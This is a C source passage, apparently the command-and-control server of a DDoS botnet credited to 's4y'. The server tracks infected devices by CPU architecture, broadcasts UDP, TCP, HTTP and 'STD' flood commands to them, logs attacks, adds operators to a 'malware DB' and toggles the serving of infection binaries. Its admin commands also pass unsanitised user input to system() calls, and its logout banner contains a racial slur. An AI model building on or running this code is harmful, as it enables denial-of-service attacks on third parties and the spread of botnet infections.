            if(mpslConnected() != 0)
            {
                sprintf(booters7,"\033[0m.mipsel\033[90m: \033[37;1m%d\r\n",     mpslConnected());
                if(send(datafd, booters7, strlen(booters7), MSG_NOSIGNAL) == -1) goto end;
            }
            if(arcConnected() != 0)
            {
                sprintf(booters8,"\033[0m.arc\033[90m: \033[37;1m%d\r\n",     arcConnected());
                if(send(datafd, booters8, strlen(booters8), MSG_NOSIGNAL) == -1) goto end;
            }
            if(sh4Connected() != 0)
            {
                sprintf(booters9,"\033[0m.sh4\033[90m: \033[37;1m%d\r\n",     sh4Connected());
                if(send(datafd, booters9, strlen(booters9), MSG_NOSIGNAL) == -1) goto end;
            }
            if(unkConnected() != 0)
            {
                sprintf(booters10,"\033[0m.unk\033[90m: \033[37;1m%d\r\n",     unkConnected());
                if(send(datafd, booters10, strlen(booters10), MSG_NOSIGNAL) == -1) goto end;
            }
            if(ppcConnected() != 0)
            {
                sprintf(booters11,"\033[0m.ppc\033[90m: \033[37;1m%d\r\n",     ppcConnected());
                if(send(datafd, booters11, strlen(booters11), MSG_NOSIGNAL) == -1) goto end;
            }
        }
        else if(strstr(buf, ".captcha enable") || strstr(buf, ".CAPTCHA ENABLE"))
        {
            if(XXXgements[datafd].adminstatus == 1)
            {
                sprintf(botnet, "\033[0mlogin captcha was successfully enabled!\033[0m\r\n");
                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
                captcano = 1;
                }
            else
            {
                sprintf(botnet, "function only for admins!\x1b[0m\r\n");
                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                
            }
        }
        else if(strstr(buf, ".captcha disable") || strstr(buf, ".CAPTCHA DISABLE"))
        {
            if(XXXgements[datafd].adminstatus == 1)
            {
                sprintf(botnet, "\033[0mlogin captcha was successfully disabled!\033[0m\r\n");
                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
                captcano = 0;
                }
            else
            {
                sprintf(botnet, "function only for admins!\x1b[0m\r\n");
                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                
            }
        }
        else if(strstr(buf, ".trigger enable") || strstr(buf, ".TRIGGER ENABLE"))
        {
            if(XXXgements[datafd].adminstatus == 1)
            {
                sprintf(botnet, "\033[0mlogin trigger was successfully enabled!\033[0m\r\n");
                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
                logintrigger = 1;
                }
            else
            {
                sprintf(botnet, "function only for admins!\x1b[0m\r\n");
                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                
            }
        }
        else if(strstr(buf, ".trigger disable") || strstr(buf, ".TRIGGER DISABLE"))
        {
            if(XXXgements[datafd].adminstatus == 1)
            {
                sprintf(botnet, "\033[0mlogin trigger was successfully disabled!\033[0m\r\n");
                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
                logintrigger = 0;
                }
            else
            {
                sprintf(botnet, "function only for admins!\x1b[0m\r\n");
                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                
            }
        }
        else if(strstr(buf, ".flood enable") || strstr(buf, ".FLOOD ENABLE"))
        {
            if(XXXgements[datafd].adminstatus == 1)
            {
                sprintf(botnet, "\033[0mfloods have been temporarily enabled!\033[0m\r\n");
                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
                checkfloods = 0;
                }
            else
            {
                sprintf(botnet, "function only for admins!\x1b[0m\r\n");
                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                
            }
        }
        else if(strstr(buf, ".flood disable") || strstr(buf, ".flood disable"))
        {
            if(XXXgements[datafd].adminstatus == 1)
            {
                sprintf(botnet, "\033[0mfloods have been temporarily disabled!\033[0m\r\n");
                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
                checkfloods = 1;
                }
            else
            {
                sprintf(botnet, "function only for admins!\x1b[0m\r\n");
                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                
            }
        }
        if(strstr(buf, "check"))
            {
                checkmyfloods(datafd);
            }

            if(strstr(buf, "/")) 
            
            if(checkfloods == 1)
            {
                char roxy[50];
                sprintf(roxy, "\033[0mfloods are temporarily disabled!\r\n");
                if(send(datafd, roxy, strlen(roxy), MSG_NOSIGNAL) == -1) goto end;
                break;
            }
        if(strstr(buf, "logout") || strstr(buf, "exit")) {
            pthread_create(&title, NULL, &TitleWriter, sock);
            char logoutmessage1 [2048];
            char logoutmessage2 [2048];
            char logoutmessage3 [2048];
            char logoutmessage4 [2048];
            char logoutmessage5 [2048];
            char logoutmessage6 [2048];

            sprintf(logoutmessage1, "\033[90m        _    _\r\n");
            sprintf(logoutmessage2, "     \033[97m__\033[38;5;202m|\033[97m_\033[38;5;202m|\033[97m__\033[38;5;202m|\033[97m_\033[38;5;202m|\033[97m__\r\n");
            sprintf(logoutmessage3, "\033[97m   \033[31m_\033[97m|\033[31m____________\033[97m|\033[31m__\r\n");
            sprintf(logoutmessage4, "\033[31m  |o o o o o o o o /  \r\n");
            sprintf(logoutmessage5, "\033[96m~~~~~~~~~~~~~~~~~~~~~~~~\r\n");
            sprintf(logoutmessage6, "\033[34mBIG BOATS MY NIGGA, YEET !\r\n");

            if(send(datafd, logoutmessage1, strlen(logoutmessage1), MSG_NOSIGNAL) == -1)goto end;
            if(send(datafd, logoutmessage2, strlen(logoutmessage2), MSG_NOSIGNAL) == -1)goto end;
            if(send(datafd, logoutmessage3, strlen(logoutmessage3), MSG_NOSIGNAL) == -1)goto end;
            if(send(datafd, logoutmessage4, strlen(logoutmessage4), MSG_NOSIGNAL) == -1)goto end;
            if(send(datafd, logoutmessage5, strlen(logoutmessage5), MSG_NOSIGNAL) == -1)goto end;
            if(send(datafd, logoutmessage6, strlen(logoutmessage6), MSG_NOSIGNAL) == -1)goto end;
            sleep(1);
            goto end;
            }
        if(strstr(buf, "STD") || strstr(buf, "STDHEX") ||strstr(buf, "HTTP") || strstr(buf, "UDP") || strstr(buf, "TCP"))
        {
            {
                sprintf(botnet, "\x1b[0mCommand sent to %d devices\r\n", BotsConnected());
                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                broadcast(buf, datafd, accounts[find_line].username);
            }
            
        }
        else if(strstr(buf, ".remove"))
        {
            if(XXXgements[datafd].adminstatus == 1)
            {
                char allow[512];
                char sys[1024];
                char printt[1024];
                memset(buf,0,sizeof(buf));
                sprintf(printt,"\x1b[0muser\x1b[90m: \x1b[0m");
                if(send(datafd, printt, strlen(printt), MSG_NOSIGNAL) == -1) goto end;
                if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
                trim(buf);
                sprintf(sys,"sed -i 's/%s//g' -i config.txt",buf);
                system(sys);
                sprintf(allow,"\x1b[0muser %s has been removed\x1b[90m!\r\n",buf);
                if(send(datafd, allow, strlen(allow), MSG_NOSIGNAL) == -1) goto end;
            }
            else
            {
                sprintf(botnet, "function only for admins!\x1b[0m\r\n");
                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                
            }
        }
        else if(strstr(buf, ".scan enable"))
        {
            if(XXXgements[datafd].adminstatus == 1)
            {
            system("mv /tmp/* /var/www/html");
            sprintf(botnet, "\x1b[0mestablishing connection with wget bins.\r\n");
            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            }
            else
            {
                sprintf(botnet, "function only for admins!\x1b[0m\r\n");
                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                
            }
        }
        else if(strstr(buf, ".scan disable"))
        {
            if(XXXgements[datafd].adminstatus == 1)
            {
            system("mv /var/www/html/* /tmp/");
            sprintf(botnet, "\x1b[0mdisconnecting connection with wget bins.\r\n");
            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            }
            else
            {
                sprintf(botnet, "function only for admins!\x1b[0m\r\n");
                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                
            }
        }
        else if(strstr(buf, ".ipban add"))
        {
            if(XXXgements[datafd].adminstatus == 1)
            {
                char bannie111[40];
                char commandban[80];
                char commandban1[80];
                
                if(send(datafd, "\x1b[37mip: \x1b[37m", strlen("\x1b[37mip: \x1b[37m"), MSG_NOSIGNAL) == -1) goto end;
                memset(bannie111, 0, sizeof(bannie111));
                read(datafd, bannie111, sizeof(bannie111));
                trim(bannie111);
                char banmsg[80];

                sprintf(commandban, "iptables -A INPUT -s %s -j DROP", bannie111);
                sprintf(commandban1, "iptables -A OUTPUT -s %s -j DROP", bannie111);

                system(commandban);
                system(commandban1);
                LogFile2 = fopen("ipbans.log", "a");
    
                fprintf(LogFile2, "[banned] |ip:%s|\n", bannie111);
                fclose(LogFile2);

                sprintf(banmsg, "ip:%s is banned\r\n", bannie111);

                if(send(datafd, banmsg,  strlen(banmsg),    MSG_NOSIGNAL) == -1) goto end;
            }
            else
            {
                sprintf(botnet, "function only for admins!\x1b[0m\r\n");
                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                
            }
        }
        else if(strstr(buf, ".ipban del"))
        {
            if(XXXgements[datafd].adminstatus == 1)
            {
                char bannie1 [800];
                char commandunban[80];
                char commandunban1[80];

                if(send(datafd, "\x1b[37mip: \x1b[37m", strlen("\x1b[37mip: \x1b[37m"), MSG_NOSIGNAL) == -1) goto end;
                memset(bannie1, 0, sizeof(bannie1));
                read(datafd, bannie1, sizeof(bannie1));
                trim(bannie1);

                char unbanmsg[80];

                sprintf(commandunban, "iptables -D INPUT -s %s -j DROP", bannie1);
                sprintf(commandunban1, "iptables -D OUTPUT -s %s -j DROP", bannie1);

                system(commandunban);
                system(commandunban1);
                LogFile2 = fopen("ipbans.log", "a");
    
                fprintf(LogFile2, "[unbanned] |ip:%s|\n", bannie1);
                fclose(LogFile2);

                sprintf(unbanmsg, "ip:%s is unbanned\r\n", bannie1);

                if(send(datafd, unbanmsg,  strlen(unbanmsg),    MSG_NOSIGNAL) == -1) goto end;
            }
            else
            {
                sprintf(botnet, "function only for admins!\x1b[0m\r\n");
                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                
            }
        }
        else if(strstr(buf, ".adduser") || strstr(buf, ".ADDUSER"))
        {
            if(XXXgements[datafd].adminstatus == 1)
            {
                char new_username[80];
                char new_password[80];
                char new_admin[80];
                char new_maxtime[100]; 
                char cmd[512];
                char send1[512];
                sprintf(botnet, "\x1b[0muser\x1b[01;37m:\x1b[0m" );
                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                memset(buf, 0, sizeof buf);
                if(fdgets(buf, sizeof(buf), datafd) < 1);
                trim(buf);
                strcpy(new_username, buf);
                sprintf(botnet, "\x1b[0mpass\x1b[01;37m:\x1b[0m" );
                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                memset(buf,0,sizeof(buf));
                if(fdgets(buf, sizeof(buf), datafd) < 1);
                trim(buf);
                strcpy(new_password, buf);
                sprintf(botnet, "\x1b[0madmin\x1b[01;37m?\x1b[0m<\x1b[1;32myes\x1b[0m/\x1b[31mno\x1b[0m>:\x1b[37m" );
                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                memset(buf,0,sizeof(buf));
                if(fdgets(buf, sizeof(buf), datafd) < 1);
                trim(buf);
                if (strstr(buf, "yes") || strstr(buf, "YES") || strstr(buf, "Yes"))
                {
                    strcpy(new_admin, "admin");
                }
                else
                {
                    strcpy(new_admin, "");
                }
                sprintf(botnet, "\x1b[0mmaxtime\x1b[01;37m:\x1b[0m" );
                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                memset(buf,0,sizeof(buf));
                if(fdgets(buf, sizeof(buf), datafd) < 1);
                trim(buf);
                strcpy(new_maxtime, buf);
                sprintf(cmd, "%s %s %s %s", new_username, new_password, new_admin, new_maxtime);
                sprintf(send1, "echo '%s' >> config.txt", cmd);
                system(send1);
                memset(buf, 0, sizeof buf);
                printf("\x1b[0m%s successfully added to malware DB!\r\n", new_username);
                sprintf(botnet, "\x1b[0m%s successfully added to malware DB!\r\n", new_username);
                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
                memset(buf, 0, sizeof buf);
            }
            else
            {
                sprintf(botnet, "functions only for admins!\x1b[0m\r\n");
                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                memset(buf, 0, sizeof buf);
            }
        }
        else if(strstr(buf, ".online") || strstr(buf, ".Online") || strstr(buf, ".ONLINE"))
        {   
            if(XXXgements[datafd].adminstatus == 1)
            {
                int online;
                strcpy(botnet, "\x1b[01;36mActive Users\r\n");
                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                for(online=0; online < MAXFDS; online++)
                {
                    if(strlen(XXXgements[online].nickname) > 1 && XXXgements[online].connected == 1)
                    {
                        sprintf(botnet, "\x1b[37mID\033[01;37m(\033[37m%d\033[01;37m) \x1b[01;37m%s\x1b[0m\r\n", online, XXXgements[online].nickname);
                        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                    }
                }
                    sprintf(botnet, "\033[0mtotal online users: \033[01;37m%d\033[0m\r\n", OperatorsConnected);
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }   
                else
                {
                sprintf(botnet, "functions only for admins!\x1b[0m\r\n");
                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                memset(buf, 0, sizeof buf);
            }
        }
        else if(strstr(buf, ".kick") || strstr(buf, ".KICK"))
        {
            if(XXXgements[datafd].adminstatus == 1)
            {
                if(strstr(buf, "user=") || strstr(buf, "USER="))
                {
                    int id;
                    char user[20];
                    char *token = strtok(buf, "=");
                    snprintf(user, sizeof(user), "%s", token+strlen(token)+1);
                    trim(user);
                    for(id=0; id < MAXFDS; id++)
                    {
                        if(strstr(XXXgements[id].nickname, user))
                        {
                            sprintf(botnet, "\n\x1b[0m%s is removing your cnc privileges\r\n", XXXgements[datafd].nickname);
                            if(send(id, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                            XXXgements[id].connected = 0;
                            close(id);
                            //managesConnected -= 1;
                            sprintf(botnet, "\x1b[0msuccessfully kicked %s\r\n", user);
                            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                        }
                    }
                }
            }
            else
            {
                sprintf(botnet, "functions only for admins!\x1b[0m\r\n");
                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                
            }
        }
        if (strncmp(buf, "none", 4) == 0 || strncmp(buf, "NONE", 8) == 0) {
            char no1 [5000];
            char no2 [5000];

            sprintf(no1, "\033[0m\033[2J\033[1;1H");
            sprintf(no2, "\033[34;1mэбот был создан и организован s4y!\r\n");

            if(send(datafd, no1, strlen(no1), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, no2, strlen(no2), MSG_NOSIGNAL) == -1) goto end;
        }
        if (strncmp(buf, "clear", 5) == 0 || strncmp(buf, "CLS", 3) == 0 || strncmp(buf, "cls", 3) == 0 ||
            strncmp(buf, "CLEAR", 5) == 0) {
       if (send(datafd, banner1lol1, strlen(banner1lol1), MSG_NOSIGNAL) == -1) goto end;
        }
        trim(buf);
        char input[5000];
        sprintf(input, "\033[0mbotnet ~$ \033[0m", accounts[find_line].username, usernamez);
        if (send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
        if (strlen(buf) == 0) continue;
        printf("%s: \"%s\"\n",accounts[find_line].username, buf);

        FILE *LogFile;
        LogFile = fopen("attack.logs", "a");
        time_t now;
        struct tm *gmt;
        char formatted_gmt [50];
        char lcltime[50];
        now = time(NULL);
        gmt = gmtime(&now);
        strftime ( formatted_gmt, sizeof(formatted_gmt), "%I:%M %p", gmt );
        fprintf(LogFile, "[%s] %s: %s\n", formatted_gmt, accounts[find_line].username, buf);
        fclose(LogFile);
        broadcast(buf, datafd, accounts[find_line].username);
        memset(buf, 0, 2048);
    }

    end:
    XXXgements[datafd].connected = 0;
    close(datafd);
    OperatorsConnected--;
}

void *BotListener(int port) {
    int sockfd, newsockfd;
    socklen_t clilen;
    struct sockaddr_in serv_addr, cli_addr;
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) perror("ERROR opening socket");
    bzero((char *) &serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = INADDR_ANY;
    serv_addr.sin_port = htons(port);
    if (bind(sockfd, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) < 0) perror("ERROR on binding");
    listen(sockfd, 5);
    clilen = sizeof(cli_addr);
    while(1)
        {  printf("\x1b[0mincoming c2 connection! ");
       
        client_addr(cli_addr);
        newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
        if (newsockfd < 0) perror("ERROR on accept");
        pthread_t thread;
        pthread_create( &thread, NULL, &BotWorker, (void *)newsockfd);
        }
}

int main(int argc, char *argv[], void *sock) {
    signal(SIGPIPE, SIG_IGN);
    int s, threads, port;
    struct epoll_event event;
    if (argc != 4) {
        fprintf(stderr, "usage ==> ./%s <BOT-PORT> <THREADS> <C2-PORT>\n", argv[0]);
        exit(EXIT_FAILURE);
    }
    port = atoi(argv[3]);
    threads = atoi(argv[2]);
    printf("\033[1;90ms4ys стероидных ботнет был экранирован\n");
    listenFD = create_and_bind(argv[1]);
    if (listenFD == -1) abort();
    s = make_socket_non_blocking(listenFD);
    if (s == -1) abort();
    s = listen(listenFD, SOMAXCONN);
    if (s == -1) {
        perror("listen");
        abort();
    }
    epollFD = epoll_create1(0);
    if (epollFD == -1) {
        perror("epoll_create");
        abort();
    }
    event.data.fd = listenFD;
    event.events = EPOLLIN | EPOLLET;
    s = epoll_ctl(epollFD, EPOLL_CTL_ADD, listenFD, &event);
    if (s == -1) {
        perror("epoll_ctl");
        abort();
    }
    pthread_t thread[threads + 2];
    while (threads--) {
        pthread_create(&thread[threads + 1], NULL, &BotEventLoop, (void *) NULL);
    }
    pthread_create(&thread[0], NULL, &BotListener, port);
    while (1) {
        broadcast(".", -1, "s4y");
        printf("\033[37mproc killed on client.\n");
        sleep(300);
    }
    close(listenFD);
    return EXIT_SUCCESS;
}